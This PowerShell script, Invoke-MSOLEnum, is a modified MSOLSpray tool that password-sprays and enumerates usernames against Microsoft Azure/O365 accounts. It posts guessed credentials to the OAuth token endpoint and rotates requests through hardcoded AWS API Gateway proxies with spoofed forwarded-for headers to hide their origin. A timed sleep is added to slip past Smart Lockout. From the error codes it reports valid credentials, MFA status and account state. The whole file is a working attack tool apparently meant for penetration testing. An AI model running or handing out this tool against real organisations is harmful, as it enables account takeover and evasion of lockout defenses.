# DO NOT DISTRIBUTE OUTSIDE OF ACA

# Invoke-MSOLEnum -UserList .\users.txt -Password Welcome1 -OutFile ValidUsers.txt -Domain targetdomain.com

# Invoke-MSOLEnum -UserList .\users.txt -PWList .\pwlist.txt -OutFile validusers.txt -Domain targetdomain.com -Sleep 61 -Region us

function Invoke-MSOLEnum{

    <#
        .CREDIT
            This primary work on this module is the creation from Beau Bullock (@dafthack).  I have simply updated it to be used for UserID enumeration against a large username list where the userlist does not contain the @domain.com.  The script will request the user to input the @domain.com when executing.
			
        .SYNOPSIS
		
            This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.       
            MSOLSpray Function: Invoke-MSOLSpray
            Author: Beau Bullock (@dafthack)
            License: BSD 3-Clause
            Required Dependencies: None
            Optional Dependencies: None
    
        .DESCRIPTION
            
            This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
            The module has also been modified from the orignal script by Beau Bullock to include the ability to provide a DOMAIN name to be appended to the user list, options for both a single PASSWORD or a FILE with a list of passwords, as well as providing a varible of the amount of seconds to SLEEP between each individual authentication attempt.      
        
        .PARAMETER UserList
            
            UserList file filled with usernames one-per-line in the format "user@domain.com"
        
        .PARAMETER Password
            
            A single password that will be used to perform the password spray.
    
        .PARAMETER PWList
            
            A file with a list of passwords that will be used to perform the password spray.
    
        .PARAMETER Domain
            
            Domain to be appended to the end each username to allow for the userlist to be a generic list without domain name included.
            
        .PARAMETER Sleep
            
            The number of SECONDS to sleep between each individual authenticaiton attempt. This was added in an attempt to overcome SmartLockOut features of MSOL. Testing indicates that by setting this value to 61 the Lockout trigger can be avoided.
    
        .PARAMETER OutFile
            
            A file to output valid results to.
        
        .PARAMETER Force
            
            Forces the spray to continue and not stop when multiple account lockouts are detected.
        
        .PARAMETER Region
            
            The AWS region to use as proxies.  Options: none, us, eu, asia, world (use all proxies)
        
        .EXAMPLE
            
            With single password
				C:\PS> Invoke-MSOLEnum -UserList .\userlist.txt -Password TESTPASS -OutFile validusers.txt -Domain company.com -Sleep 61
				
            Description
            -----------
            This command will use the provided userlist and attempt to authenticate to each account with a password of TESTPASS.
        
            With a File containing multiple passwords
				C:\PS> Invoke-MSOLEnum -UserList .\userlist.txt -PWList ./pwlist.txt -OutFile validusers.txt -Domain company.com -Sleep 61
				
            Description
            -----------
            This command will use the provided userlist and to attempt to authenticate to each account with a passwords of in the ./pwlist.txt file.
    
        .EXAMPLE
            
            C:\PS> Invoke-MSOLEnum -UserList .\userlist.txt -Password TESTPASS -Region us -Domain company.com -OutFile valid-users.txt -Sleep 61
			
            Description
            -----------
            This command uses the specified AWS region to spray from randomized IP addresses and writes the output to a file. 
    #>
      Param(

        [Parameter(Position = 0, Mandatory = $False)]
        [string]
        $OutFile = "",
    
        [Parameter(Position = 1, Mandatory = $False)]
        [string]
        $UserList = "",
    
        [Parameter(Position = 2, Mandatory = $False)]
        [string]
        $Password = "",
    
        [Parameter(Position = 3, Mandatory = $False)]
        [string]
        $Region = "none",
    
        [Parameter(Position = 4, Mandatory = $False)]
        [switch]
        $Force,
        
        # DOMAIN name
        [Parameter(Position = 4, Mandatory = $False)]
        [string]
        $Domain = "",
    
        # Password List
        [Parameter(Position = 4, Mandatory = $False)]
        [string]
        $PWList = "",
    
        # Sleep timer
        [Parameter(Position = 4, Mandatory = $False)]
        [string]
        $Sleep = "",
    
        # Password Temp File
        [Parameter(Position = 4, Mandatory = $False)]
        [string]
        $PWFile = ""
      )

        $us = "https://ezsm6wjc3e.execute-api.us-east-1.amazonaws.com/fireprox", `
        "https://st47v7p8q9.execute-api.us-east-2.amazonaws.com/fireprox", `
		"https://2o7q7npiif.execute-api.us-west-1.amazonaws.com/fireprox", `
		"https://0da5q918db.execute-api.us-west-2.amazonaws.com/fireprox", `
		"https://dgop7q77u4.execute-api.ca-central-1.amazonaws.com/fireprox"

        $eu = "https://p5ot2n8sk7.execute-api.eu-central-1.amazonaws.com/fireprox", `
        "https://uvlkk7sbz1.execute-api.eu-west-1.amazonaws.com/fireprox", `
        "https://qdz0pbw4v0.execute-api.eu-west-2.amazonaws.com/fireprox", `
		"https://tsxjukq2l1.execute-api.eu-west-3.amazonaws.com/fireprox", `
		"https://5665fh4moh.execute-api.eu-north-1.amazonaws.com/fireprox"

        $asia = "https://2qq7knjbbb.execute-api.ap-south-1.amazonaws.com/fireprox", `
        "https://ivzkmtv3nj.execute-api.ap-northeast-2.amazonaws.com/fireprox", `
        "https://75u2a9f3qc.execute-api.ap-southeast-1.amazonaws.com/fireprox", `
		"https://efyueqls02.execute-api.ap-southeast-2.amazonaws.com/fireprox", `
		"https://um8upan08j.execute-api.ap-northeast-1.amazonaws.com/fireprox"

        $other = ,"https://ebtu4yggu3.execute-api.sa-east-1.amazonaws.com/fireprox"
		
		switch($Region)
        {
			"none" {$proxies = ,"https://login.microsoft.com"; Break}
            "us" {$proxies = $us; Break}
            "eu" {$proxies = $eu; Break}
            "asia" {$proxies = $asia; Break}
	        "world" {$proxies = $us + $eu + $asia + $other; Break}
        }

        $ErrorActionPreference= 'silentlycontinue'
        $Usernames = Get-Content $UserList
    
        $count = $Usernames.count
		$proxyCounter = 0
        $curr_user = 0
        $lockout_count = 0
        $lockoutquestion = 0
        $fullresults = @()
    
        Write-Host -ForegroundColor "yellow" ("[*] There are " + $count + " total users to spray.")
    
    
                # Allow user to verify expected password spray interval based on sleep time and number of user accounts, before proceeding
                if ($PWList)
                {
                    If (!$Sleep -or $Sleep -eq 0)
                    {
                        Write-Host -ForegroundColor "red" ("[*] WARNING - With no Sleep value or Sleep = 0, cannot calculate expected per password time interval.")
                    }
                    $title = "[*] With a Sleep value of " + $Sleep + " seconds, it will take aprox "+ [math]::Truncate($count*$sleep/60) + " minutes per password."
                    $message = "Do you want to continue this spray?"
    
                    $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
                        "Continues the password spray."
    
                    $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
                        "Cancels the password spray."
    
                    $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
    
                    $result = $host.ui.PromptForChoice($title, $message, $options, 0)
                    $continuequestion++
                    if ($result -ne 0)
                    {
                        Write-Host "[*] Cancelling the password spray."
                        break
                    }
                }
            Write-Host -ForegroundColor "yellow" "[*] Now spraying Microsoft Online."
            $currenttime = Get-Date
            Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"                
    
    
        # When a single password is supplied in the command line and NOT a file with list of passwords
        If ($Password)
        {
            $Password | Out-File -Encoding ascii ./pwfile-temp.txt
        }
    
        # When a file with a list of passwords to spray is provided in the command line
        If ($PWList)
        {
        #    $PWFile = Get-Content $PWList
        #    $PWFile | Out-File -Encoding ascii ./pwfile-temp.txt
        Copy-Item $PWList -Destination ./pwfile-temp.txt
        }
    
        $Passwords = Get-Content ./pwfile-temp.txt
        
        ForEach ($Password in $Passwords){
            Write-Host -ForegroundColor "yellow" "[*] Current Password to Spray: $Password"
            ForEach ($username in $usernames){
                
                # User counter
                $curr_user += 1
                Write-Host -nonewline "$curr_user of $count users tested`r"

                # Setting up the web request
                $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username+'@'+$domain ; 'password' = $password ; 'scope' = 'openid'}
                $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' = 'application/x-www-form-urlencoded'; 'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36'; 'X-My-X-Forwarded-For' = "3.$(get-random -maximum 254).$(get-random -maximum 254).$(get-random -maximum 254)"} # Random 3.*.*.* forwarded address
                $uri = $proxies[$proxyCounter]+"/common/oauth2/token"
				$webrequest = Invoke-WebRequest $uri -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr

				#$uri
################################################################################################

                # Cycle through selected proxies
                $proxyCounter += 1

                if ($proxies.Count -eq $proxyCounter) {
                    $proxyCounter = 0
                }

                # If we get a 200 response code it's a valid cred
                If ($webrequest.StatusCode -eq "200"){
                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password"
                    $webrequest = ""
                    $fullresults += "$username : $password"
                    Start-Sleep -s $Sleep
                }
                else{
                        # Check the response for indication of MFA, tenant, valid user, etc...
                        # Here is a referense list of all the Azure AD Authentication an Authorization Error Codes:
                        # https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes
    
                        # Standard invalid password
                    If($RespErr -match "AADSTS50126")
                        {
                        Write-Host -ForegroundColor "white" "[*] ENUMERATED! $username@$domain"
                        $fullresults += "$username@$domain"
                        Start-Sleep -s $Sleep
                        }
    
                        # Invalid Tenant Response
                    ElseIf (($RespErr -match "AADSTS50128") -or ($RespErr -match "AADSTS50059"))
                        {
                        Write-Output "[*] WARNING! Tenant for account $username doesn't exist. Check the domain to make sure they are using Azure/O365 services."
                        Start-Sleep -s $Sleep
                        }
                        
                        # Invalid Username
                    ElseIf($RespErr -match "AADSTS50034")
                        {
                        Write-Output "[*] Invalid UserID: $username@$domain"
                        Start-Sleep -s $Sleep
                        }
    
                        # Microsoft MFA response
                    ElseIf(($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076"))
                        {
                        Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates MFA (Microsoft) is in use."
                        $fullresults += "$username : $password"
                        Start-Sleep -s $Sleep
                        }
            
                        # Conditional Access response (Based off of limited testing this seems to be the repsonse to DUO MFA)
                    ElseIf($RespErr -match "AADSTS50158")
                        {
                        Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
                        $fullresults += "$username : $password"
                        Start-Sleep -s $Sleep
                        }
    
                        # Locked out account or Smart Lockout in place
                    ElseIf($RespErr -match "AADSTS50053")
                        {
                        Write-Output "[*] WARNING! The account $username appears to be locked."
                        $lockout_count++
                        Start-Sleep -s $Sleep
                        }
    
                        # Disabled account
                    ElseIf($RespErr -match "AADSTS50057")
                        {
                        Write-Output "[*] WARNING! The account $username appears to be disabled."
                        Start-Sleep -s $Sleep
                        }
                    
                        # User password is expired
                    ElseIf($RespErr -match "AADSTS50055")
                        {
                        Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The user's password is expired."
                        $fullresults += "$username : $password"
                        Start-Sleep -s $Sleep
                        }
    
                        # Unknown errors
                    Else
                        {
                        Write-Output "[*] Got an error we haven't seen yet for user $username"
                        #$RespErr
                        Start-Sleep -s $Sleep
                        }
                }
            
                # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
                if (!$Force -and $lockout_count -eq 10 -and $lockoutquestion -eq 0)
                {
                    $title = "WARNING! Multiple Account Lockouts Detected!"
                    $message = "10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?"
    
                    $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
                        "Continues the password spray."
    
                    $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
                        "Cancels the password spray."
    
                    $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
    
                    $result = $host.ui.PromptForChoice($title, $message, $options, 0)
                    $lockoutquestion++
                    if ($result -ne 0)
                    {
                        Write-Host "[*] Cancelling the password spray."
                        Write-Host "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled."
                        break
                    }
                }
                
            }
        }
    
        # Output to file
        if ($OutFile -ne "")
        {
            If ($fullresults)
            {
            $fullresults | Out-File -Encoding ascii $OutFile
            Write-Output "Results have been written to $OutFile."
            }
        Remove-Item ./pwfile-temp.txt
        }
    }